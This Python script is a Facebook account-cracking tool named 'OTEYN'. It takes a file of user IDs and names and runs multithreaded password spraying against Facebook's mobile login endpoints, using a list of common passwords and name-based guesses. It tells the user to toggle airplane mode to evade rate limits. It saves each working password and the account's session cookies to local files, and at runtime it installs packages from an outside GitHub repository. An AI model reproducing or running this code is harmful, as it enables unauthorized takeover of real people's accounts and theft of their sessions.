

###---------------### MODULES ###--------------- ###


import os, time, base64, datetime, json, sys, re, threading, uuid, string
from concurrent.futures import ThreadPoolExecutor as ThreadPool

os.system("pip uninstall PySintx -y")
os.system("pip uninstall PyBookScrapper -y")
os.system("pip uninstall PyBookAgents -y")

try:
    import PySintx
except ModuleNotFoundError:
    os.system("pip3 install git+https://github.com/sintxcs/PySintx.git")
    import PySintx
from PySintx import *

'''
I'm using PySintx for my text color and modules dependencies like rich, random, and requests.
'''

try:
    import PyBookAgents
except ModuleNotFoundError:
    os.sytem("pip3 install git+https://github.com/sintxcs/PyBookAgents.git")
    import PyBookAgents

'''
I'm using PyBookAgents for user-agent generator
Check documentaion here: https://github.com/sintxcs/PyBookAgents
'''

try:
    import PyBookScrapper
except ModuleNotFoundError:
    os.system("pip3 install git+https://github.com/sintxcs/PyBookScrapper.git")
    import PyBookScrapper

# I'm using PyBookScrapper for scrapping of the following:
from PyBookScrapper import Scrape_Year

'''
Check documentaion here: https://github.com/sintxcs/PyBookScrapper
'''

###---------------### VARIABLES ###--------------- ###


_F = "/sdcard/SINTX/"
_D = "clear"
_B = "\n"
_A = "bold white"

try:
    os.makedirs(_F)
except:
    pass
sntxfldr = _F

cmd(_D)


###---------------### DATE TIME CHECKER ###--------------- ###


script_status = "FREE"
months_check = {
    "1": "January",
    "2": "February",
    "3": "March",
    "4": "April",
    "5": "May",
    "6": "June",
    "7": "July",
    "8": "August",
    "9": "September",
    "10": "October",
    "11": "November",
    "12": "December",
}
date_now = datetime.datetime.now().day
month_now = months_check[str(datetime.datetime.now().month)]
date_month = str(month_now) + "-" + str(date_now)


###---------------### LOGO ###--------------- ###


lxgos = "\n\n                d8,                               \n               `8P              d8P               \n                             d888888P             \n       .d888b,  88b  88bd88b   ?88'  ?88,  88P    \n       ?8b,     88P  88P' ?8b  88P    `?8bd8P'    \n         `?8b  d88  d88   88P  88b    d8P?8b,     \n      `?888P' d88' d88'   88b  `?8b  d8P' `?8b    \n                                            \n                                            \n                                            \n"
sinInfo = "[white][÷] PRESS [bold yellow]CTRL AND Z[bold white] TO STOP THE PROGRAM\n\n[white][-] TOOL NAME    : OTEYN\n[-] SCRIPT OWNER : SINTXCS\n[-] FACEBOOK     : EIFF HUCZN\n[-] GITHUB       : OTEYN"


def sintx_logo():
    cmd(_D)
    prnt(pnl(lxgos, title=f"{script_status}", subtitle="SHEESHHH !"))
    prnt(pnl(sinInfo, width=90, style=_A))


###---------------### MENU ###--------------- ###


def sintx_menu():
    B = "[sky_blue1][1] FILE CLONING\n[0] REPORT ERROR"
    sintx_logo()
    prnt(pnl(B, width=90, style=_A, title="OPTIONS"))
    A = input(f"{green}  [?] OPTION:{dark_gray} ")
    if A == "1":
        ク克隆()
    if A == "0":
        cmd("xdg-open https://m.me/61553865513324")
        sintx_menu()
    else:
        print(f"{ro}  [!] INVALID INPUT")
        sintx_menu()


###---------------### FILE CLONING ###--------------- ###


loop = 0
oks = []
cps = []
twf = []
ugen = []


def ク克隆():
    sintx_logo()
    E = "/sdcard/"
    prnt(pnl("[yellow][Â»] ENTER NAME OF YOUR FILE (ex: EIFF.txt)", width=90, style=_A))
    F = input(f"{green}  [+] /sdcard/:{dark_gray} ")
    G = E + F
    try:
        B = open(G, "r").read().splitlines()
    except FileNotFoundError:
        cd(1)
        print(f"\n{lr}  [X] FILE NOT FOUND")
        cd(3)
        ク克隆()
    A = []
    prnt(
        pnl(
            "[sky_blue1][1] SYSTEM PASSWORD LIST\n[2] YOUR PASSWORD LIST",
            width=90,
            style=_A,
            title="SELECT PASSWORD METHOD",
        )
    )
    H = input(f"{green}  [÷] CHOICE:{dark_gray} ")
    if H in ["1", "01"]:
    	A.append("firstgwapa")
        A.append("firstgwapo")
        A.append("lastfirst")
        A.append("last first")
        A.append("first last")
        A.append("first123")
        A.append("first12")
        A.append("first143")
        A.append("first12345")
        A.append("first123456")
        A.append("first_123")
        A.append("maganda")
        A.append("magandaako")
        A.append("gandako")
        A.append("ganda")
        A.append("cuteako")
        A.append("god143")
        A.append("i love you")
        A.append("firstpretty")
        A.append("firstpogi")
        A.append("firstigop")
        A.append("firstdump")
        A.append("potanginamo")
        A.append("lastlast")
        A.append("firstfirst")
        A.append("firstganda")
        A.append("firstmaganda")
        A.append("blackpink")
        A.append("jungkook")
        A.append("pogiko")
        A.append("pogiako")
    else:
        try:
            prnt(
                pnl(
                    "[yellow][÷] HOW MANY PASSWORD DO YOU WANT TO USE?",
                    width=90,
                    style=_A,
                )
            )
            C = int(input(f"{green}  [÷] ANSWER:{dark_gray} "))
        except:
            C = 1
        prnt(
            pnl(
                "[yellow] first last, first123, first143, last123, last143",
                width=90,
                style=_A,
                title="EXAMPLE PASSWORD",
            )
        )
        for I in range(C):
            A.append(input(f"{green}  [÷] PASSWORD #{I+1}:{dark_gray} "))
    with ThreadPool(max_workers=None) as J:
        prnt(
            pnl(
                "[yellow][Â»] ON/OFF FIRST YOUR DATA FOR 5 SECONDS AND PRESS ENTER",
                width=90,
                style=_A,
                title="INSTRUCTIONS",
            )
        )
        input(f"{green}  [Â»] PRESS ENTER: ")
        sintx_logo()
        D = str(len(B))
        prnt(
            pnl(
                "[yellow][Â»] [ON/OFF] AIRPLANE MODE EVERY 90 SECS!",
                width=90,
                style=_A,
                title="TAKE NOTE!",
            )
        )
        K = "[white][-] TOTAL IDS TO CLONE: " + D + "\n[-] RESULT PATH: OTEYN FOLDER"
        prnt(pnl(K, width=90, style=_A, title="FILE INFO"))
        for L in B:
            M, N = L.split("|")
            O = A
            J.submit(sinsAPI_, M, N, O, D)
    P = "[Â»] HITS : " + str(len(oks))
    Q = "\n[Â»] CPS  : " + str(len(cps))
    print(_B)
    prnt(pnl(P + Q, width=90, style=_A, title="PROCESS COMPLETED"))
    input(f"{dark_gray}  [÷] PRESS ENTER TO REFRESH ")
    sintx_menu()


###---------------### API (MBASIC) ###--------------- ###


def sinsAPI_(uid, names, pxss_, tot4l):
    F = names
    A = uid
    global loop, oks, cps
    sys.stdout.write(
        f"\r\r{dark_gray}  [OTEYN] %s/%s - OKS: %s - CPS: %s\r "
        % (loop, tot4l, len(oks), len(cps))
    )
    sys.stdout.flush()
    C = requests.Session()
    try:
        G = F.split(" ")[0]
        try:
            D = F.split(" ")[1]
        except:
            D = "143"
        L = G.lower()
        M = D.lower()
        for N in pxss_:
            B = (
                N.replace("First", G)
                .replace("Last", D)
                .replace("first", L)
                .replace("last", M)
            )
            header = {
                "authority": "mbasic.facebook.com",
                "method": "get",
                "scheme": "https",
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                "accept-encoding": "gzip, deflate, br",
                "accept-language": "en-US,en;q=0.9",
                "cache-control": "max-age=0",
                "cookie": "datr=dQmDZc0_ths1lroZrRvDUe84; sb=dQmDZfWn6Xc_QVthOy3O5zGS; vpd=v1%3B822x424x2.549999952316284; wd=424x801; fr=0bA2JLigoFkhzRLyr.AWW8dLd2IOSHnYXVt7nnoww6bJQ.BlgxDQ.xP.AAA.0.0.Blod0N.AWWSL0xCtNY",
                "dpr": "2.549999952316284",
                "referer": "https://m.facebook.com/",
                "sec-ch-prefers-color-scheme": "dark",
                "sec-ch-ua": "\"Not)A;Brand\";v=\"24\", \"Chromium\";v=\"116\"",
                "sec-ch-ua-full-version-list": "\"Not)A;Brand\";v=\"24.0.0.0\", \"Chromium\";v=\"116.0.5845.240\"",
                "sec-ch-ua-mobile": "?1",
                "sec-ch-ua-model": "\"RMX3241\"",
                "sec-ch-ua-platform": "\"Android\"",
                "sec-ch-ua-platform-version": "\"13.0.0\"",
                "sec-fetch-dest": "document",
                "sec-fetch-mode": "navigate",
                "sec-fetch-site": "none",
                "sec-fetch-user": "?1",
                "upgrade-insecure-requests": "1",
                "user-agent": str(PyBookAgents.random_ugen()),
                "viewport-width": "980"
            }
            I = C.get(
                f"https://m.facebook.com/login/device-based/password/?uid={A}&flow=login_no_pin&refsrc=deprecated&_rdr"
            )
            S = {
                "lsd": re.search('name="lsd" value="(.*?)"', str(I.text)).group(1),
                "jazoest": re.search('name="jazoest" value="(.*?)"', str(I.text)).group(
                    1
                ),
                "uid": A,
                "next": "https://mbasic.facebook.com/login/save-device/",
                "flow": "login_no_pin",
                "pass": B,
            }
            C.post(
                "https://m.facebook.com/login/device-based/validate-password/?shbl=0",
                data=S,
                allow_redirects=False,
                headers=header,
            ).text
            J = C.cookies.get_dict().keys()
            if "c_user" in J:
                K = ";".join(
                    ["%s=%s" % (A, B) for (A, B) in C.cookies.get_dict().items()]
                )
                open(sntxfldr + f"HITS-{date_month}.txt", "a").write(
                    A + "|" + B + "~" + Scrape_Year(uid) + _B + K + "\n\n"
                )
                print(_B)
                T = f"[white]UID  : {A}\nPASS : {B}\nYEAR : {Scrape_Year(uid)}"
                E = pnl(
                    T, width=90, style="bold pale_turquoise1", title="OTEYN SUCCESSFUL"
                )
                prnt(E)
                oks.append(A)
                break
            elif "checkpoint" in J:
                cps.append(A)
                print(_B)
                U = f"[white]UID  : {A}\nPASS : {B}\nYEAR : {Scrape_Year(uid)}"
                E = pnl(U, width=90, style="bold red", title="OTEYN CHECKPOINT")
                prnt(E)
                open(sntxfldr + f"CPS-{date_month}.txt", "a").write(
                    A + "|" + B + "~" + Scrape_Year(uid) + _B
                )
                break
            else:
                continue
        loop += 1
    except requests.exceptions.ConnectionError:
        time.sleep(20)


###---------------### START ###--------------- ###


if __name__ == "__main__":
    try:
        sintx_menu()
    except Exception as e:
        exit()
